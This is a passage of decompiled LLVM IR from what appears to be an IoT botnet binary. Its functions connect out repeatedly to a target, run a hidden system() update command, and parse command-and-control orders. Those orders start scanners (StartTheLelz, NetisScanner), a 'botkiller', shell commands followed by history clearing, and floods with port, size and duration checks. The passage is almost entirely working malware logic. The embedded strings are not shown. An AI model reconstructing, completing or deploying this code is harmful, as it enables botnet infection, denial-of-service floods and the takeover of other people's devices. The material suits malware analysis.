  uselistorder label %dec_label_pc_f418, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f398, { 1, 0 }
}

define i32 @sendCNC(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_f490 = call i32 @__GI_time(i32* null)
  %v2_f49c = add i32 %v2_f490, %arg3
  store i32 %arg1, i32* @r0, align 4
  %v1_f4ac = call i32 @inet_addr(i32 %arg1)
  store i32 2, i32* %stack_var_-40, align 4
  %v3_f4c8 = urem i32 %arg2, 65536
  %v1_f4d0 = call i32 @__GI_htons(i32 %v3_f4c8)
  %v2_f4f8 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_f51c

dec_label_pc_f4e0:                                ; preds = %dec_label_pc_f51c
  %v3_f4ec = call i32 @socket(i32 2, i32 1, i32 0)
  %v3_f508 = call i32 @__libc_connect(i32 %v3_f4ec, i32 %v2_f4f8, i32 16)
  %v1_f510 = call i32 @sleep(i32 1)
  %v1_f518 = call i32 @__GI_close(i32 %v3_f4ec)
  br label %dec_label_pc_f51c

dec_label_pc_f51c:                                ; preds = %entry, %dec_label_pc_f4e0
  %v2_f520 = call i32 @__GI_time(i32* null)
  %v5_f530 = icmp slt i32 %v2_f520, %v2_f49c
  br i1 %v5_f530, label %dec_label_pc_f4e0, label %dec_label_pc_f534

dec_label_pc_f534:                                ; preds = %dec_label_pc_f51c
  ret i32 %v2_f520

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_f51c, { 1, 0 }
}

define i32 @UpdateBins(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v0_f550 = call i32 @__libc_fork()
  %v2_f560 = icmp eq i32 %v0_f550, 0
  br i1 %v2_f560, label %dec_label_pc_f568, label %dec_label_pc_f57c

dec_label_pc_f568:                                ; preds = %entry
  %v2_f56c = call i32 @__libc_system(i32 ptrtoint ([439 x i8]* @global_var_25e10.832 to i32))
  %v1_f574 = call i32 @sleep(i32 20)
  br label %dec_label_pc_f588

dec_label_pc_f57c:                                ; preds = %entry
  %v4_f584 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_25fc8.834, i32 0, i32 0), i32 %v0_f550)
  br label %dec_label_pc_f588

dec_label_pc_f588:                                ; preds = %dec_label_pc_f568, %dec_label_pc_f57c
  %storemerge = phi i32 [ %v4_f584, %dec_label_pc_f57c ], [ %v1_f574, %dec_label_pc_f568 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder label %dec_label_pc_f588, { 1, 0 }
}

define i32 @processCmd(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_f59c = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_f59c, i32* @ip, align 4
  %v3_f5a0 = load i32, i32* @r4, align 4
  %v6_f5a0 = load i32, i32* @r5, align 4
  %v9_f5a0 = load i32, i32* @r6, align 4
  %v12_f5a0 = load i32, i32* @r7, align 4
  %v15_f5a0 = load i32, i32* @r8, align 4
  %v18_f5a0 = load i32, i32* @fp, align 4
  store i32 62888, i32* %stack_var_-4, align 4
  %v2_f5a4 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_f5a4, i32* @fp, align 4
  %v2_f5b8 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_25fcc.836 to i32), i32* @r1, align 4
  %v3_f5c4 = inttoptr i32 %v2_f5b8 to i8*
  %v4_f5c4 = call i32 @__GI_strcoll(i8* %v3_f5c4, i32 ptrtoint ([7 x i8]* @global_var_25fcc.836 to i32))
  %v2_f5cc = icmp eq i32 %v4_f5c4, 0
  br i1 %v2_f5cc, label %dec_label_pc_f5d4, label %dec_label_pc_f6e4

dec_label_pc_f5d4:                                ; preds = %entry
  %v1_f5d8 = add i32 %tmp, 4
  %v1_f5dc = inttoptr i32 %v1_f5d8 to i32*
  %v2_f5dc = load i32, i32* %v1_f5dc, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_25fd4.838 to i32), i32* @r1, align 4
  %v3_f5e8 = inttoptr i32 %v2_f5dc to i8*
  %v4_f5e8 = call i32 @__GI_strcoll(i8* %v3_f5e8, i32 ptrtoint ([8 x i8]* @global_var_25fd4.838 to i32))
  %v2_f5f0 = icmp eq i32 %v4_f5e8, 0
  br i1 %v2_f5f0, label %dec_label_pc_f5f8, label %dec_label_pc_f618

dec_label_pc_f5f8:                                ; preds = %dec_label_pc_f5d4
  %v2_f5fc = call i32 @__libc_system(i32 ptrtoint ([130 x i8]* @global_var_25fdc.840 to i32))
  %v1_f600 = call i32 @ClearHistory(i32 %v2_f5fc)
  %v2_f608 = load i32, i32* @global_var_28570.50, align 4
  %v3_f614 = call i32 @sockprintf(i32 %v2_f608, i32 ptrtoint ([26 x i8]* @global_var_26060.843 to i32))
  br label %dec_label_pc_f618

dec_label_pc_f618:                                ; preds = %dec_label_pc_f5d4, %dec_label_pc_f5f8
  %v2_f620 = load i32, i32* %v1_f5dc, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_2607c.845 to i32), i32* @r1, align 4
  %v3_f62c = inttoptr i32 %v2_f620 to i8*
  %v4_f62c = call i32 @__GI_strcoll(i8* %v3_f62c, i32 ptrtoint ([7 x i8]* @global_var_2607c.845 to i32))
  %v2_f634 = icmp eq i32 %v4_f62c, 0
  br i1 %v2_f634, label %dec_label_pc_f63c, label %dec_label_pc_f65c

dec_label_pc_f63c:                                ; preds = %dec_label_pc_f618
  %v2_f640 = call i32 @__libc_system(i32 ptrtoint ([47 x i8]* @global_var_26084.847 to i32))
  %v1_f644 = call i32 @ClearHistory(i32 %v2_f640)
  %v2_f64c = load i32, i32* @global_var_28570.50, align 4
  %v3_f658 = call i32 @sockprintf(i32 %v2_f64c, i32 ptrtoint ([24 x i8]* @global_var_260b4.849 to i32))
  br label %dec_label_pc_f65c

dec_label_pc_f65c:                                ; preds = %dec_label_pc_f618, %dec_label_pc_f63c
  %v2_f664 = load i32, i32* %v1_f5dc, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_260cc.851 to i32), i32* @r1, align 4
  %v3_f670 = inttoptr i32 %v2_f664 to i8*
  %v4_f670 = call i32 @__GI_strcoll(i8* %v3_f670, i32 ptrtoint ([4 x i8]* @global_var_260cc.851 to i32))
  %v2_f678 = icmp eq i32 %v4_f670, 0
  br i1 %v2_f678, label %dec_label_pc_f680, label %dec_label_pc_f6a0

dec_label_pc_f680:                                ; preds = %dec_label_pc_f65c
  %v2_f684 = call i32 @__libc_system(i32 ptrtoint ([31 x i8]* @global_var_260d0.853 to i32))
  %v1_f688 = call i32 @ClearHistory(i32 %v2_f684)
  %v2_f690 = load i32, i32* @global_var_28570.50, align 4
  %v3_f69c = call i32 @sockprintf(i32 %v2_f690, i32 ptrtoint ([24 x i8]* @global_var_260f0.855 to i32))
  br label %dec_label_pc_f6a0

dec_label_pc_f6a0:                                ; preds = %dec_label_pc_f65c, %dec_label_pc_f680
  %v2_f6a8 = load i32, i32* %v1_f5dc, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_26108.857 to i32), i32* @r1, align 4
  %v3_f6b4 = inttoptr i32 %v2_f6a8 to i8*
  %v4_f6b4 = call i32 @__GI_strcoll(i8* %v3_f6b4, i32 ptrtoint ([6 x i8]* @global_var_26108.857 to i32))
  %v2_f6bc = icmp eq i32 %v4_f6b4, 0
  br i1 %v2_f6bc, label %dec_label_pc_f6c4, label %dec_label_pc_f6e4

dec_label_pc_f6c4:                                ; preds = %dec_label_pc_f6a0
  %v2_f6c8 = call i32 @__libc_system(i32 ptrtoint ([40 x i8]* @global_var_26110.859 to i32))
  %v1_f6cc = call i32 @ClearHistory(i32 %v2_f6c8)
  %v2_f6d4 = load i32, i32* @global_var_28570.50, align 4
  %v3_f6e0 = call i32 @sockprintf(i32 %v2_f6d4, i32 ptrtoint ([28 x i8]* @global_var_26138.861 to i32))
  br label %dec_label_pc_f6e4

dec_label_pc_f6e4:                                ; preds = %dec_label_pc_f6a0, %entry, %dec_label_pc_f6c4
  %v2_f6e8 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1df24.52 to i32), i32* @r1, align 4
  %v3_f6f4 = inttoptr i32 %v2_f6e8 to i8*
  %v4_f6f4 = call i32 @__GI_strcoll(i8* %v3_f6f4, i32 ptrtoint ([5 x i8]* @global_var_1df24.52 to i32))
  %v2_f6fc = icmp eq i32 %v4_f6f4, 0
  br i1 %v2_f6fc, label %dec_label_pc_f704, label %dec_label_pc_f71c

dec_label_pc_f704:                                ; preds = %dec_label_pc_f6e4
  %v2_f708 = load i32, i32* @global_var_28570.50, align 4
  %v3_f714 = call i32 @sockprintf(i32 %v2_f708, i32 ptrtoint ([6 x i8]* @global_var_26154.864 to i32))
  br label %dec_label_pc_10860

dec_label_pc_f71c:                                ; preds = %dec_label_pc_f6e4
  %v2_f720 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_2615c.866 to i32), i32* @r1, align 4
  %v3_f72c = inttoptr i32 %v2_f720 to i8*
  %v4_f72c = call i32 @__GI_strcoll(i8* %v3_f72c, i32 ptrtoint ([6 x i8]* @global_var_2615c.866 to i32))
  %v2_f734 = icmp eq i32 %v4_f72c, 0
  br i1 %v2_f734, label %dec_label_pc_f73c, label %dec_label_pc_f760

dec_label_pc_f73c:                                ; preds = %dec_label_pc_f71c
  %v2_f740 = load i32, i32* @global_var_28570.50, align 4
  store i32 %v2_f740, i32* @r4, align 4
  %v0_f744 = call i32 @getdtablesize()
  %v0_f74c = load i32, i32* @r4, align 4
  store i32 %v0_f744, i32* @r2, align 4
  %v3_f758 = call i32 @sockprintf(i32 %v0_f74c, i32 ptrtoint ([3 x i8]* @global_var_26164.868 to i32))
  br label %dec_label_pc_10860

dec_label_pc_f760:                                ; preds = %dec_label_pc_f71c
  %v2_f764 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_2607c.845 to i32), i32* @r1, align 4
  %v3_f770 = inttoptr i32 %v2_f764 to i8*
  %v4_f770 = call i32 @__GI_strcoll(i8* %v3_f770, i32 ptrtoint ([7 x i8]* @global_var_2607c.845 to i32))
  %v2_f778 = icmp eq i32 %v4_f770, 0
  br i1 %v2_f778, label %dec_label_pc_f780, label %dec_label_pc_f7a0

dec_label_pc_f780:                                ; preds = %dec_label_pc_f760
  %v2_f784 = load i32, i32* @global_var_28570.50, align 4
  %v3_f790 = call i32 @sockprintf(i32 %v2_f784, i32 ptrtoint ([25 x i8]* @global_var_26168.870 to i32))
  %v1_f798 = call i32 @UpdateBins(i32 1)
  br label %dec_label_pc_10860

dec_label_pc_f7a0:                                ; preds = %dec_label_pc_f760
  %v2_f7a4 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_26184.872 to i32), i32* @r1, align 4
  %v3_f7b0 = inttoptr i32 %v2_f7a4 to i8*
  %v4_f7b0 = call i32 @__GI_strcoll(i8* %v3_f7b0, i32 ptrtoint ([8 x i8]* @global_var_26184.872 to i32))
  %v2_f7b8 = icmp eq i32 %v4_f7b0, 0
  br i1 %v2_f7b8, label %dec_label_pc_f7c0, label %dec_label_pc_f8dc

dec_label_pc_f7c0:                                ; preds = %dec_label_pc_f7a0
  %v1_f7c4 = add i32 %tmp, 4
  %v1_f7c8 = inttoptr i32 %v1_f7c4 to i32*
  %v2_f7c8 = load i32, i32* %v1_f7c8, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_260cc.851 to i32), i32* @r1, align 4
  %v3_f7d4 = inttoptr i32 %v2_f7c8 to i8*
  %v4_f7d4 = call i32 @__GI_strcoll(i8* %v3_f7d4, i32 ptrtoint ([4 x i8]* @global_var_260cc.851 to i32))
  %v2_f7dc = icmp eq i32 %v4_f7d4, 0
  br i1 %v2_f7dc, label %dec_label_pc_f7e4, label %dec_label_pc_f828

dec_label_pc_f7e4:                                ; preds = %dec_label_pc_f7c0
  %v2_f7e8 = load i32, i32* @global_var_2e7d4.874, align 4
  %v2_f7ec = icmp eq i32 %v2_f7e8, 0
  br i1 %v2_f7ec, label %dec_label_pc_10860, label %dec_label_pc_f7f4

dec_label_pc_f7f4:                                ; preds = %dec_label_pc_f7e4
  %v2_f804 = call i32 @kill(i32 %v2_f7e8, i32 9)
  %v2_f80c = load i32, i32* @global_var_28570.50, align 4
  %v3_f818 = call i32 @sockprintf(i32 %v2_f80c, i32 ptrtoint ([17 x i8]* @global_var_2618c.876 to i32))
  store i32 0, i32* @global_var_2e7d4.874, align 4
  br label %dec_label_pc_f828

dec_label_pc_f828:                                ; preds = %dec_label_pc_f7c0, %dec_label_pc_f7f4
  %v2_f830 = load i32, i32* %v1_f7c8, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_261a0.878 to i32), i32* @r1, align 4
  %v3_f83c = inttoptr i32 %v2_f830 to i8*
  %v4_f83c = call i32 @__GI_strcoll(i8* %v3_f83c, i32 ptrtoint ([3 x i8]* @global_var_261a0.878 to i32))
  store i32 %v4_f83c, i32* @r0, align 4
  %v2_f844 = icmp eq i32 %v4_f83c, 0
  br i1 %v2_f844, label %dec_label_pc_f84c, label %dec_label_pc_f8dc

dec_label_pc_f84c:                                ; preds = %dec_label_pc_f828
  %v2_f850 = load i32, i32* @global_var_2e7d4.874, align 4
  %v2_f854 = icmp eq i32 %v2_f850, 0
  br i1 %v2_f854, label %dec_label_pc_f85c, label %dec_label_pc_10860

dec_label_pc_f85c:                                ; preds = %dec_label_pc_f84c
  %v0_f85c = call i32 @__libc_fork()
  %v2_f87c = icmp eq i32 %v0_f85c, 0
  br i1 %v2_f87c, label %dec_label_pc_f8a0, label %dec_label_pc_f884

dec_label_pc_f884:                                ; preds = %dec_label_pc_f85c
  store i32 %v0_f85c, i32* @global_var_2e7d4.874, align 4
  br label %dec_label_pc_10860

dec_label_pc_f8a0:                                ; preds = %dec_label_pc_f85c
  %v2_f8a4 = load i32, i32* @global_var_28570.50, align 4
  store i32 %v2_f8a4, i32* @r4, align 4
  %v2_f8ac = load i32, i32* @global_var_2e7cc.314, align 4
  store i32 %v2_f8ac, i32* @r0, align 4
  %v1_f8b0 = call i32 @__GI_inet_ntoa(i32 %v2_f8ac)
  %v0_f8b8 = load i32, i32* @r4, align 4
  store i32 %v1_f8b0, i32* @r2, align 4
  %v3_f8c4 = call i32 @sockprintf(i32 %v0_f8b8, i32 ptrtoint ([26 x i8]* @global_var_261a4.881 to i32))
  %v2_f8d0 = call i32 @StartTheLelz(i32 10, i32 1000)
  %v1_f8d8 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_f8dc

dec_label_pc_f8dc:                                ; preds = %dec_label_pc_f828, %dec_label_pc_f7a0, %dec_label_pc_f8a0
  %v2_f8e0 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_261c0.883 to i32), i32* @r1, align 4
  %v3_f8ec = inttoptr i32 %v2_f8e0 to i8*
  %v4_f8ec = call i32 @__GI_strcoll(i8* %v3_f8ec, i32 ptrtoint ([6 x i8]* @global_var_261c0.883 to i32))
  %v2_f8f4 = icmp eq i32 %v4_f8ec, 0
  br i1 %v2_f8f4, label %dec_label_pc_f8fc, label %dec_label_pc_fa14

dec_label_pc_f8fc:                                ; preds = %dec_label_pc_f8dc
  %v1_f900 = add i32 %tmp, 4
  %v1_f904 = inttoptr i32 %v1_f900 to i32*
  %v2_f904 = load i32, i32* %v1_f904, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_260cc.851 to i32), i32* @r1, align 4
  %v3_f910 = inttoptr i32 %v2_f904 to i8*
  %v4_f910 = call i32 @__GI_strcoll(i8* %v3_f910, i32 ptrtoint ([4 x i8]* @global_var_260cc.851 to i32))
  %v2_f918 = icmp eq i32 %v4_f910, 0
  br i1 %v2_f918, label %dec_label_pc_f920, label %dec_label_pc_f978

dec_label_pc_f920:                                ; preds = %dec_label_pc_f8fc
  %v2_f924 = load i32, i32* @global_var_2e7d4.874, align 4
  %v2_f928 = icmp eq i32 %v2_f924, 0
  br i1 %v2_f928, label %dec_label_pc_10860, label %dec_label_pc_f930

dec_label_pc_f930:                                ; preds = %dec_label_pc_f920
  %v2_f940 = call i32 @kill(i32 %v2_f924, i32 9)
  %v2_f948 = load i32, i32* @global_var_28570.50, align 4
  store i32 %v2_f948, i32* @r4, align 4
  %v2_f950 = load i32, i32* @global_var_2e7cc.314, align 4
  store i32 %v2_f950, i32* @r0, align 4
  %v1_f954 = call i32 @__GI_inet_ntoa(i32 %v2_f950)
  %v0_f95c = load i32, i32* @r4, align 4
  store i32 %v1_f954, i32* @r2, align 4
  %v3_f968 = call i32 @sockprintf(i32 %v0_f95c, i32 ptrtoint ([23 x i8]* @global_var_261c8.885 to i32))
  store i32 0, i32* @global_var_2e7d4.874, align 4
  br label %dec_label_pc_f978

dec_label_pc_f978:                                ; preds = %dec_label_pc_f8fc, %dec_label_pc_f930
  %v2_f980 = load i32, i32* %v1_f904, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_261a0.878 to i32), i32* @r1, align 4
  %v3_f98c = inttoptr i32 %v2_f980 to i8*
  %v4_f98c = call i32 @__GI_strcoll(i8* %v3_f98c, i32 ptrtoint ([3 x i8]* @global_var_261a0.878 to i32))
  store i32 %v4_f98c, i32* @r0, align 4
  %v2_f994 = icmp eq i32 %v4_f98c, 0
  br i1 %v2_f994, label %dec_label_pc_f99c, label %dec_label_pc_fa14

dec_label_pc_f99c:                                ; preds = %dec_label_pc_f978
  %v2_f9a0 = load i32, i32* @global_var_2e7d4.874, align 4
  %v2_f9a4 = icmp eq i32 %v2_f9a0, 0
  br i1 %v2_f9a4, label %dec_label_pc_f9ac, label %dec_label_pc_10860

dec_label_pc_f9ac:                                ; preds = %dec_label_pc_f99c
  %v0_f9ac = call i32 @__libc_fork()
  %v2_f9bc = icmp eq i32 %v0_f9ac, 0
  br i1 %v2_f9bc, label %dec_label_pc_f9e0, label %dec_label_pc_f9c4

dec_label_pc_f9c4:                                ; preds = %dec_label_pc_f9ac
  store i32 %v0_f9ac, i32* @global_var_2e7d4.874, align 4
  br label %dec_label_pc_10860

dec_label_pc_f9e0:                                ; preds = %dec_label_pc_f9ac
  %v2_f9e4 = load i32, i32* @global_var_28570.50, align 4
  store i32 %v2_f9e4, i32* @r4, align 4
  %v2_f9ec = load i32, i32* @global_var_2e7cc.314, align 4
  store i32 %v2_f9ec, i32* @r0, align 4
  %v1_f9f0 = call i32 @__GI_inet_ntoa(i32 %v2_f9ec)
  %v0_f9f8 = load i32, i32* @r4, align 4
  store i32 %v1_f9f0, i32* @r2, align 4
  %v3_fa04 = call i32 @sockprintf(i32 %v0_f9f8, i32 ptrtoint ([23 x i8]* @global_var_261e0.887 to i32))
  %v1_fa08 = call i32 @NetisScanner(i32 %v3_fa04)
  %v1_fa10 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_fa14

dec_label_pc_fa14:                                ; preds = %dec_label_pc_f978, %dec_label_pc_f8dc, %dec_label_pc_f9e0
  %v2_fa18 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_261f8.889 to i32), i32* @r1, align 4
  %v3_fa24 = inttoptr i32 %v2_fa18 to i8*
  %v4_fa24 = call i32 @__GI_strcoll(i8* %v3_fa24, i32 ptrtoint ([8 x i8]* @global_var_261f8.889 to i32))
  store i32 %v4_fa24, i32* @r0, align 4
  %v2_fa2c = icmp eq i32 %v4_fa24, 0
  br i1 %v2_fa2c, label %dec_label_pc_fa34, label %dec_label_pc_fa78

dec_label_pc_fa34:                                ; preds = %dec_label_pc_fa14
  %v0_fa34 = call i32 @listFork()
  %v2_fa3c = icmp eq i32 %v0_fa34, 0
  br i1 %v2_fa3c, label %dec_label_pc_fa44, label %dec_label_pc_fa78

dec_label_pc_fa44:                                ; preds = %dec_label_pc_fa34
  %v2_fa48 = load i32, i32* @global_var_28570.50, align 4
  store i32 %v2_fa48, i32* @r4, align 4
  %v2_fa50 = load i32, i32* @global_var_2e7cc.314, align 4
  store i32 %v2_fa50, i32* @r0, align 4
  %v1_fa54 = call i32 @__GI_inet_ntoa(i32 %v2_fa50)
  %v0_fa5c = load i32, i32* @r4, align 4
  store i32 %v1_fa54, i32* @r2, align 4
  %v3_fa68 = call i32 @sockprintf(i32 %v0_fa5c, i32 ptrtoint ([29 x i8]* @global_var_26200.891 to i32))
  %v1_fa6c = call i32 @botkiller(i32 %v3_fa68)
  %v1_fa74 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_fa78

dec_label_pc_fa78:                                ; preds = %dec_label_pc_fa34, %dec_label_pc_fa14, %dec_label_pc_fa44
  %v2_fa7c = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([12 x i8]* @global_var_26220.893 to i32), i32* @r1, align 4
  %v3_fa88 = inttoptr i32 %v2_fa7c to i8*
  %v4_fa88 = call i32 @__GI_strcoll(i8* %v3_fa88, i32 ptrtoint ([12 x i8]* @global_var_26220.893 to i32))
  %v2_fa90 = icmp eq i32 %v4_fa88, 0
  br i1 %v2_fa90, label %dec_label_pc_fa98, label %dec_label_pc_fac4

dec_label_pc_fa98:                                ; preds = %dec_label_pc_fa78
  %v2_fa9c = load i32, i32* @global_var_28570.50, align 4
  store i32 %v2_fa9c, i32* @r4, align 4
  %v2_faa4 = load i32, i32* @global_var_2e7cc.314, align 4
  store i32 %v2_faa4, i32* @r0, align 4
  %v1_faa8 = call i32 @__GI_inet_ntoa(i32 %v2_faa4)
  %v0_fab0 = load i32, i32* @r4, align 4
  store i32 %v1_faa8, i32* @r2, align 4
  %v3_fabc = call i32 @sockprintf(i32 %v0_fab0, i32 ptrtoint ([17 x i8]* @global_var_2622c.895 to i32))
  br label %dec_label_pc_10860

dec_label_pc_fac4:                                ; preds = %dec_label_pc_fa78
  %v2_fac8 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_26240.897 to i32), i32* @r1, align 4
  %v3_fad4 = inttoptr i32 %v2_fac8 to i8*
  %v4_fad4 = call i32 @__GI_strcoll(i8* %v3_fad4, i32 ptrtoint ([4 x i8]* @global_var_26240.897 to i32))
  %v2_fadc = icmp eq i32 %v4_fad4, 0
  br i1 %v2_fadc, label %dec_label_pc_fae4, label %dec_label_pc_fe44

dec_label_pc_fae4:                                ; preds = %dec_label_pc_fac4
  %v7_faec = icmp slt i32 %arg1, 6
  br i1 %v7_faec, label %dec_label_pc_fc04, label %dec_label_pc_faf0

dec_label_pc_faf0:                                ; preds = %dec_label_pc_fae4
  %v1_faf4 = add i32 %tmp, 12
  %v1_faf8 = inttoptr i32 %v1_faf4 to i32*
  %v2_faf8 = load i32, i32* %v1_faf8, align 4
  store i32 %v2_faf8, i32* @r0, align 4
  %v1_fb00 = call i32 @atol(i32 %v2_faf8)
  %v7_fb08 = icmp eq i32 %v1_fb00, -1
  br i1 %v7_fb08, label %dec_label_pc_fc04, label %dec_label_pc_fb10

dec_label_pc_fb10:                                ; preds = %dec_label_pc_faf0
  %v1_fb14 = add i32 %tmp, 8
  %v1_fb18 = inttoptr i32 %v1_fb14 to i32*
  %v2_fb18 = load i32, i32* %v1_fb18, align 4
  store i32 %v2_fb18, i32* @r0, align 4
  %v1_fb20 = call i32 @atol(i32 %v2_fb18)
  %v7_fb28 = icmp eq i32 %v1_fb20, -1
  br i1 %v7_fb28, label %dec_label_pc_fc04, label %dec_label_pc_fb30

dec_label_pc_fb30:                                ; preds = %dec_label_pc_fb10
  %v1_fb34 = add i32 %tmp, 16
  %v1_fb38 = inttoptr i32 %v1_fb34 to i32*
  %v2_fb38 = load i32, i32* %v1_fb38, align 4
  store i32 %v2_fb38, i32* @r0, align 4
  %v1_fb40 = call i32 @atol(i32 %v2_fb38)
  %v7_fb48 = icmp eq i32 %v1_fb40, -1
  br i1 %v7_fb48, label %dec_label_pc_fc04, label %dec_label_pc_fb50

dec_label_pc_fb50:                                ; preds = %dec_label_pc_fb30
  %v1_fb54 = add i32 %tmp, 20
  %v1_fb58 = inttoptr i32 %v1_fb54 to i32*
  %v2_fb58 = load i32, i32* %v1_fb58, align 4
  store i32 %v2_fb58, i32* @r0, align 4
  %v1_fb60 = call i32 @atol(i32 %v2_fb58)
  %v7_fb68 = icmp eq i32 %v1_fb60, -1
  br i1 %v7_fb68, label %dec_label_pc_fc04, label %dec_label_pc_fb70

dec_label_pc_fb70:                                ; preds = %dec_label_pc_fb50
  %v2_fb78 = load i32, i32* %v1_fb58, align 4
  store i32 %v2_fb78, i32* @r0, align 4
  %v1_fb80 = call i32 @atol(i32 %v2_fb78)
  %v8_fb8c = icmp sgt i32 %v1_fb80, 65536
  br i1 %v8_fb8c, label %dec_label_pc_fc04, label %dec_label_pc_fb90

dec_label_pc_fb90:                                ; preds = %dec_label_pc_fb70
  %v2_fb98 = load i32, i32* %v1_fb58, align 4
  store i32 %v2_fb98, i32* @r0, align 4
  %v1_fba0 = call i32 @atol(i32 %v2_fb98)
  store i32 %v1_fba0, i32* @r2, align 4
  %v8_fbb4 = icmp sgt i32 %v1_fba0, 65500
  br i1 %v8_fbb4, label %dec_label_pc_fc04, label %dec_label_pc_fbb8

dec_label_pc_fbb8:                                ; preds = %dec_label_pc_fb90
  %v2_fbc0 = load i32, i32* %v1_fb38, align 4
  store i32 %v2_fbc0, i32* @r0, align 4
  %v1_fbc8 = call i32 @atol(i32 %v2_fbc0)
  %v8_fbd4 = icmp sgt i32 %v1_fbc8, 32
  br i1 %v8_fbd4, label %dec_label_pc_fc04, label %dec_label_pc_fbd8

dec_label_pc_fbd8:                                ; preds = %dec_label_pc_fbb8
  %v7_fbdc = icmp eq i32 %arg1, 7
  br i1 %v7_fbdc, label %dec_label_pc_fbe4, label %dec_label_pc_fc1c

dec_label_pc_fbe4:                                ; preds = %dec_label_pc_fbd8
  %v1_fbe8 = add i32 %tmp, 24
  %v1_fbec = inttoptr i32 %v1_fbe8 to i32*
  %v2_fbec = load i32, i32* %v1_fbec, align 4
  store i32 %v2_fbec, i32* @r0, align 4
  %v1_fbf4 = call i32 @atol(i32 %v2_fbec)
  %v5_fc00 = icmp sgt i32 %v1_fbf4, 0
  br i1 %v5_fc00, label %dec_label_pc_fc1c, label %dec_label_pc_fc04

dec_label_pc_fc04:                                ; preds = %dec_label_pc_fbe4, %dec_label_pc_fbb8, %dec_label_pc_fb90, %dec_label_pc_fb70, %dec_label_pc_fb50, %dec_label_pc_fb30, %dec_label_pc_fb10, %dec_label_pc_faf0, %dec_label_pc_fae4
  %v2_fc08 = load i32, i32* @global_var_28570.50, align 4
  %v3_fc14 = call i32 @sockprintf(i32 %v2_fc08, i32 ptrtoint ([113 x i8]* @global_var_26244.899 to i32))
  br label %dec_label_pc_10860

dec_label_pc_fc1c:                                ; preds = %dec_label_pc_fbd8, %dec_label_pc_fbe4
  %v1_fc20 = add i32 %tmp, 4
  %v1_fc24 = inttoptr i32 %v1_fc20 to i32*
  %v2_fc24 = load i32, i32* %v1_fc24, align 4
  %v2_fc34 = load i32, i32* %v1_fb18, align 4
  store i32 %v2_fc34, i32* @r0, align 4
  %v1_fc3c = call i32 @atol(i32 %v2_fc34)
  %v2_fc50 = load i32, i32* %v1_faf8, align 4
  store i32 %v2_fc50, i32* @r0, align 4
  %v1_fc58 = call i32 @atol(i32 %v2_fc50)
  %v2_fc6c = load i32, i32* %v1_fb38, align 4
  store i32 %v2_fc6c, i32* @r0, align 4
  %v1_fc74 = call i32 @atol(i32 %v2_fc6c)
  %v2_fc88 = load i32, i32* %v1_fb58, align 4
  store i32 %v2_fc88, i32* @r0, align 4
  %v1_fc90 = call i32 @atol(i32 %v2_fc88)
  %v7_fca4 = icmp slt i32 %arg1, 7
  br i1 %v7_fca4, label %dec_label_pc_fcc4, label %dec_label_pc_fca8

dec_label_pc_fca8:                                ; preds = %dec_label_pc_fc1c
  %v1_fcac = add i32 %tmp, 24
  %v1_fcb0 = inttoptr i32 %v1_fcac to i32*
  %v2_fcb0 = load i32, i32* %v1_fcb0, align 4
  store i32 %v2_fcb0, i32* @r0, align 4
  %v1_fcb8 = call i32 @atol(i32 %v2_fcb0)
  br label %dec_label_pc_fccc

dec_label_pc_fcc4:                                ; preds = %dec_label_pc_fc1c
  br label %dec_label_pc_fccc

dec_label_pc_fccc:                                ; preds = %dec_label_pc_fca8, %dec_label_pc_fcc4
  %storemerge10 = phi i32 [ 1000, %dec_label_pc_fcc4 ], [ %v1_fcb8, %dec_label_pc_fca8 ]
  %v7_fcdc = icmp slt i32 %arg1, 8
  br i1 %v7_fcdc, label %dec_label_pc_fcfc, label %dec_label_pc_fce0

dec_label_pc_fce0:                                ; preds = %dec_label_pc_fccc
  %v1_fce4 = add i32 %tmp, 28
  %v1_fce8 = inttoptr i32 %v1_fce4 to i32*
  %v2_fce8 = load i32, i32* %v1_fce8, align 4
  store i32 %v2_fce8, i32* @r0, align 4
  %v1_fcf0 = call i32 @atol(i32 %v2_fce8)
  br label %dec_label_pc_fd10

dec_label_pc_fcfc:                                ; preds = %dec_label_pc_fccc
  br label %dec_label_pc_fd10

dec_label_pc_fd10:                                ; preds = %dec_label_pc_fce0, %dec_label_pc_fcfc
  %storemerge9 = phi i32 [ 1000000, %dec_label_pc_fcfc ], [ %v1_fcf0, %dec_label_pc_fce0 ]
  %v7_fd20 = icmp slt i32 %arg1, 9
  br i1 %v7_fd20, label %dec_label_pc_fd40, label %dec_label_pc_fd24

